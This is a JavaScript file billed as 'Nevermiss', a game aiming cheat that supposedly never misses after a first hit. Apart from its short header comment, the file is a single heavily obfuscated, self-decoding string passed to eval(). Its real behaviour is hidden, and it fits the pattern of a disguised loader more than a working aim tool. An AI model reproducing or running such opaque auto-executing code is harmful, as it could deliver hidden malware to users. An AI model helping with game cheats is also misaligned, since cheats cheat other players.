/**
 * Nevermiss
 * Never miss a shot again
 * Author: Zeki#0001
 * 
 * This script will make it so once you hit someone you will never miss another target.
 * It uses very advanced logic to predict your enemy's position using angle logging, believe me.
 */

eval((function (s) {
	var a, c, e, i, j, o = "",
		r, t = "¡¢£¤¥¦§¨©ª«¬­®¯°±²³´µ¶·¸¹º»¼½¾¿ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÚÛÜÝÞßàáâãäåæçèéêëìíîïðñòóôõö÷øùúûüýþ#.@`";
	for (i = 0; i < s.length; i++) {
		r = t + s[i][2];
		a = s[i][1].split("");
		for (j = a.length - 1; j >= 0; j--) {
			s[i][0] = s[i][0].split(r.charAt(j)).join(a[j]);
		}
		o += s[i][0];
	}
	var p = 6588;
	var x = function (r) {
		var c, p, s, l = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789';
		if (r < 63) c = l.charAt(r);
		else {
			r -= 63;
			p = Math.floor(r / 63);
			s = r % 63;
			c = l.charAt(p) + l.charAt(s)
		}
		return c;
	};
	a = o.substr(p).split(':');
	r = a[1].split('?');
	a = a[0].split('?');
	o = o.substr(0, p);
	if (!''.replace(/^/, String)) {
		var z = {};
		for (i = 0; i < 206; i++) {
			var y = x(i);
			z[y] = r[i] || y
		}
		t = /\b\w\w?\b/g;
		y = function (a) {
			return z[a] || a
		};
		o = o.replace(t, y);
	} else {
		for (j = a[a.length - 1] - 1; j >= 0; j--) {
			if (r[j]) o = o.replace(new RegExp('\b' + (j < 63 ? c.charAt(j) : c.charAt((j - 63) / 63) + c.charAt((j - 63) % 63)) + '\b', 'g'), r[j])
		}
	}
	return o.replace(//g, "\n");
})([
	["var y­['§vÂk\\Yß77§4¢9§i§Cåv\\Oí¢8\\9ß2f×W§p§_áNñp\\5\\8ÂX×9í¢bfÞD§d§uåq§BÞk§P§r§A\\1¨'×E§6Bí§D§rá9§T8Ô1§E§PN§p§u\\r§RñBò\\Y§i§o§pÂW§4¢XÑß4c§b\\9§B§p¢X§b\\_Ù§N\\r§z¨'\\OD§5×9§z§R×O\\X¢_§4æ\\Y§n§k\\X¢1§9C§B×u×W§4§b×9í¢7u§M×O§E§gÑuæò\\1ôe§M§n§vÔh\\OÞEòôfuzÑ§lsÔY§kÑ§A\\5\\Y§n¢1ôeC§T§l§r§b§d\\9§A×M§o§l×M§Es§p§uæ\\O§C¨'·_§Q\\4§b\\9\\Y§o§N\\9\\8Ñ§AÕ4èxÑ§cæ§qÑ\\r§aÑ§T\\9Ü_§z§aæ§j\\5\\8§qàí§z§a§sÑ§n\\7í§v\\YÂï§våo§c\\8§A\\5§kð5§b_§n\\Y\\4í§Q§p\\5§a§s\\5æ§dnÑß4cÇ4í·2·2·ï§s§" +
		"n§b\\4ÑÂO\\4\\OÂh\\7æÕ7§MÎn\\8Þb§V§8\\_ÑÞBÑ§iÀ_§aÂY§oð9§iÑ§UÎ4§Q§n\\Y\\9Ñ§cæÑ\\9æ\\r§s\\_Ñ§c\\O\\r§sÇ4§_ÂhåxÞb§oíåa\\_bæ§j\\9\\Y\\_íÕ_§j\\4§q\\X§xÑÕ_§5\\XÜUÀ_èq§jÂh\\4§dÂ8åg§vÜN§v§a§q§Aôf\\O\\4§DÂhÂnÞb§x§MÞlí\\r§bæ§jÞa\\_íÂY\\4§TÂh\\4§_\\5§lUÂW§V\\1\\5§lÞlåsÇ7í§z\\YåB§P\\8æôaÂY\\4í§n§d\\1ÑíÞbæ§kÂY§q§A\\9æ§V§b§v§qÑÀW§BÂWv\\Y\\7ÑÞBÑ§UÎ4Ù§oÂh§q§c§v\\O_Î4§sÎ7àÑÇ4§gÞbs\\9Üf\\5§lÂn§c\\OTÂh§q§MÂO\\4Ç_Ñò§d§b§r§kñ8§z§C\\pß3d']¼3 PªcµV¥c­cöc]¼a0ÃPÉp÷ªi¥3 wîN­ah(iýE­''¯aüµtµFµZQ; F" +
		"­NÉkÊ(ZFùt­a5)útF : FµaúE@& ty¦±q)»a & b7³aH¦eØKêbFØWØM³aI¥F­wÉiÊ(F²l Eû¼PÉnÊªw¥3 N­m(wäE­[]¯a­-ca¤RØ0»aIµt­N¿; a#t; a++¥E += '%'¦('00'¦N¾a)ÉdÊ(b6ØL»0Á1c3a))ÉUÊ(-(-bX»0¦-a3Ð2603)²l aG(E)ûµÛ­{}µPÉpâû3 D­Û[c]¼l D© ?ÃI­PÉnÊ(I)µÛ[c]­I) : I­DµIû¼3 cªPµV¥P­PöP]¼a0ÃcÉl÷ªw¥3 NîE­ah(wýa­''¯tüµFµZµeQ; Z­EÉkÊ(eZùF­t5)úFZ : Zµtúa@& Fy¦±q)»t & b7³aH¦eØKêbFØWØM³aI¥Z­NÉiÊ(Z²l aû¼3 iªwµN¥3 E­[],a­-ca¤RØ0»aI,tµF­'',Z­''¼w­m(w)¯Q­b6ØL»0Á1c4aµL­w¿; Q#L; Q++¥Z += '%'¦('00'¦w¾Q)ÉdÊ(-bX»0¦-a3Ð2611))" +
		"ÉUÊ(-(-b_¦-aI»bZ20a1)²w­aG(Zäe¼aYÃe­cm»co¦-h¤A; e#cbØj»b8Ð337³aZ; e++¥Ï­eûaYÃe­bS¤N«Á2705; e#-cf¦-cj»0xeÐff7; e++¥a­(a¦Ï¦N¾e % N¿))óccØCÁ211c)µt­ÏµÏ­ëµë­tûe­-bzØt«4963µa­-bB¤j³ckÐ19c3¯y­±I¤2Ð2602; y#w¿; y++¥e­(e¦(bx¤s¦aI»0x146))ó0x95³b5Ð1c10«Ð1ff9»0)µa­(a¦Ï)ó-0x255»aIÁf79¦0»0x1523)µt­ÏµÏ­ëµë­tµFøw¾y) ^ E[(Ï¦ë)ó-aI«x22cÐb77Áecf)]²l Fû¼cÉoÊ­iµé­{}µcÉlâû3 D­é[P]¼l D© ?ÃcÉmÊ©ùcÉmâ)µI­cÉoÊ(IµV)µé[P]­I) : I­DµIû¼eval(dÃVµIµmµDµiµw¥iªN¹P('Åc¡xÓv\\O§BE(¥bcÃi--¥f[x(S)]­b[Hg(U²T­[dÃK¥l C[K]û]µv" +
		"ª¥l '§S\\Yôb'ûµM­-a3Ð73Ð16ceû} aFlÃN#Iú'' : i(parseInt(N / I)))¦((N­N % I) > -b_¦-aI»bZÁ7«x4aeúah[c¡a'µ'ôg§R\\8§PÖN¦(cm»co¦-hÁ21e2êN[c¡l'µ'§Aß5e§QÖcbØj»b8Ð82«x41))û¼a0Ã!'' [c¡XÈN§b§CÖ/^/µah)¹c¡oÈz§X§Q§UÅP¡WN(¥l m[D]û} aF {bcÃm--¹P¡OÅP¡O'))w[i(m)]­D[mi(m)¼Æ E(¥t[F]ùR­G[c¡XÈN§b§CÖbV T(¸¦J(vË)µM[f])D­[dÃt¹c¡VÈuA') !== P¡R'))l w[t]¼Æ F(¥E­I[c¡d'µ'ß5e§MôeÖbV t(¸¦F(ZË)µt[j]]µiª¹c¡rÈ7§jæôTÅc¡rÈ7§jæôT'))l c¡gÓE§A§d')¼Æ t(¥l c¡gÓE§A§d'µm­bS¤N«Á2704û}¼bcÃm--¹'\\Yôe§T§q§z' === c('æÈj" +
		"ôTæ')¹D[m]¹P¡x') !== P¡xt(¥lÃi#jú'' : Q(L(s / z)))¦((R­G % T) > -cf¦-cj»0xeÐf1aúJ[c¡xß31ÈEÑ×TÖv¦(ccØC¤AêM['§P§DPå7\\8Ê(-bzØt«4987)²} aFV­V['åi§5§6§R§r§iÊ(bV RegExp(¸¦i(mË)µD[m]²} Æ F(¥E[I(t)]­F[Zi(jl Vû('Ý§Cºß22§t§t\\u§wÝ\\9ºÂq\\u§w§V\\B§r\\pÝ§nº\\q\\u§w§Q\\B§gÚQ\\B§iÚl\\Bæ\\A§u\\u§L§P\\BÝ§4\\6ôf\\At§u\\uÍ\\8ÌO\\Aæ\\A§r°L§O\\AôgÝ\\Y\\A°L§O\\A§iß3e\\p§x\\uÝ\\7º§z£q§R£q§p£av\\u§K\\5§LÝ\\7º§z£q§R£q§p£n\\u§Kß7dÍ\\OÌgôbß2bÍ§7ÌV\\B§u\\pí\\6\\A§D\\6§5ºôa\\q°w§V\\B§6\\pí\\6\\A§D\\6§" +
		"5º§B\\q°w§O\\Aí\\6§d\\A§u\\uß26ß26ôgí\\6§d\\A§6°iôbß2bÍ§qÌgÚi\\p§KÒN£8½Òc£O½Òs£a7½§W\\6§oº\\X£aq½'µ-bB¤j³ckÐ19f3µ±I¤2Ð2632µP¡x§a')[c¡x§lÈp§gôg§6Ö'ß7c')µbx¤s¦aH»0xd9µ{}));0?206:ìfunctionì®78??®30?return?.c?abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789®3d®22®7a??®29ì??®28®20ìììì®68ìì?®66.3®77?®76¬®57®38?var®58.2®2e®72®67.4®32.d.6®62?undefined®6e®64?String®65®53.e®33?charCodeAt®79®35®6d®6a®63.8®2c®6b.1®3b®31?fromCharCode®71®56.b.7®6f®52?else?decodeURIComponent´3´2?length®7d®7b®50." +
		"a®37®74®73®61®5c®5a®55®39®36®34?for´a®59?if?baNryS?OXkSmZ¬740®75®70®6c®69®54®51.9®2b?while?toString.f.5®21?replace?indexOf´9?charAt?YTLlKH?XOQNcv?SIZkBJ?NfXaxJ?HwYBgZ´46ef´3344´26ef´269f´25b9´2584´24f7´2464´238a´22c4´21ff´2191´2089¬f7d¬e60¬e38¬e1c¬dac¬cdc¬bbb¬a53¬7a0¬710¬6cf¬636¬3c7¬37b¬095¬036®24?slice?new´fe8´ec1´bcd´b5f´9e1´988´93c´926´7cd´713´5´4aa´3e9´382´30d´27b¬94¬93¬90¬75¬67¬66¬60¬35´f8´de´c2´49´48´47´38¬d",
		"('\\k\\h\\a\\p','\\\\q\\at\\ + -b) { + \\a\\p\\x3d', === ae = d ( * -0?0x1 = ?x;aY (3 \\u\\x29§-0 * b);} * -?0x, \\B\\x20\\B§c\\O\\4\\'§S§d'¥a0 (\\A\\q * ;\\6§X\\u§w['am'](['aJ']§c§i\\¦-0x\\r\\ ( += ah['') === aF {d\\X§k\\'µ'§['b'])¦¸µ'\\8'\\A\\u§L§§K§l\\B\\9\\O\\E[e]¦0x\\n§W\\6§oº§'µ'\\ba§§C¨'\\\\5§k\\')](\\1§¦b\\1\\5\\8\\W\\p\\k§w§P['a2Ê\\8\\_§§a\\6\\X§\\x§s§n§a§8×E\\5§r§Ê­!![]-aH³b)¼3 \\7§\\W -Ã±D¤PØ§U§n\\Y§c['a1Ê)) : E[a]???\\2­'o+/=',2\\7\\Y§o\\kÀ9Ñ\\§p§D§',' %Ã\\b)ÉhÊ(/=+çräI­y[Ê©¥3 mÄayÊ( &&Ã ? ¼}­-b1Øw¤Jõ$/µ''ä­ci³cq¦-0«xaZ³c§g§\\kþÐf³cd¦ãóbv¤9»a++); ~')¥d ²}}§j§\\hZ¦-cg»b»(-bH¦±3Øu)¦] || ¶ß20\\_§§f++ó-bG«¦cn¤E))øã4ØO¦§c§r§\\5\\O < ®4-cl»cp  >>Ã-(a`H»bYØ",
		""
	]
]));